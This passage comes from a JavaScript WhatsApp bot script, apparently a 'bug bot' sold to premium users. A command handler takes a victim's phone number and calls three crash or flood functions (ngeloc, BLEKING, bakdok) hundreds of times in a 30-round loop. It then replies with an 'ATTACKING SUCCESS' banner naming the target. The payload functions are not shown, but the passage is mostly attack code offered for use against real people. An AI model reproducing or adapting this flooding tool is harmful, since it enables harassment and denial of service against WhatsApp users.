await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
}
reply(`「 𒈒𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒✔ 」
  🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃
│──▄────▄▄▄▄▄▄▄────▄───│
│─▀▀▄─▄█████████▄─▄▀▀──│
│─────██─▀███▀─██──────│
│───▄─▀████▀████▀─▄────│
│─▀█────██▀█▀██────█▀──│
│༂ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐓𝐎 : ${target} ༂         
│༂ 𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command} ༂
│𝐒𝐜𝐫𝐢𝐩𝐭 𝐓𝐨 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 3.0,
│𝐣𝐚𝐧𝐠𝐚𝐧 𝐦𝐞𝐧𝐠𝐮𝐣𝐢 𝐤𝐞𝐩𝐚𝐝𝐚 
│𝐨𝐫𝐚𝐧𝐠 𝐲𝐚𝐧𝐠 𝐠𝐚𝐤 𝐚𝐝𝐚 𝐬𝐚𝐥𝐚𝐡
╚─────「 𝐁𝐮𝐠 🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃 𝐆𝐚𝐜𝐨𝐫🤩」──`)
break

case 'agler-system': case 'agler-system': case 'agler-system': case 'agler-system': case 'agler-system': case 'agler-forger':
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 30; i++) {
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
